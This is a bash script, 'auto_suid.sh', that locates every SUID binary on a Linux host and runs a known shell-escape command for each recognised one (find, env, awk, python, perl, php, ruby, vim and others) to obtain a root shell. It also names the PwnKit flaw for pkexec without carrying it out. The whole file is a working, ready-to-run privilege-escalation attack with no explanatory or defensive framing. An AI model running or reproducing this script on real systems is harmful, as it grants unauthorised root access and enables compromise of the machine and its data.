#!/bin/bash
# auto_suid.sh - Automatically exploit SUID binaries
# USAGE: ./auto_suid.sh
# Better TTY handling and more binaries.
# 1. Collect all SUIDs first to avoid stdin conflicts
echo "[*] Collecting SUID binaries..."
SUIDS=$(find / -perm -4000 -type f 2>/dev/null)
for binary in $SUIDS; do
    base=$(basename "$binary")
    echo "[*] Testing: $binary"
    case "$base" in
        "find")
            $binary . -exec /bin/sh -p \; -quit
            ;;
        "bash")
            $binary -p
            ;;
        "env")
            $binary /bin/sh -p
            ;;
        "taskset")
            $binary 1 /bin/sh -p
            ;;
        "capsh")
            $binary --gid=0 --uid=0 --
            ;;
        "flock")
            $binary -u / /bin/sh -p
            ;;
        "awk")
            $binary 'BEGIN {system("/bin/sh -p")}'
            ;;
        "python"*|"python3"*|"python2"*)
            $binary -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
            ;;
        "perl")
            $binary -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
            ;;
        "php")
            $binary -r "posix_setuid(0); system('/bin/bash -p');"
            ;;
        "ruby")
            $binary -e 'Process.setuid(0); exec "/bin/sh -p"'
            ;;
        "vim"|"vi")
            echo "[!] Requires TTY. If it hangs, CTRL+C."
            $binary -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        "pkexec")
            echo "[!] Attempting PwnKit (CVE-2021-4034)..."
            # Assumes you have the exploit on disk or can trigger it
            ;;
        *)
            echo "[-] manual check needed for $base"
            ;;
    esac
done
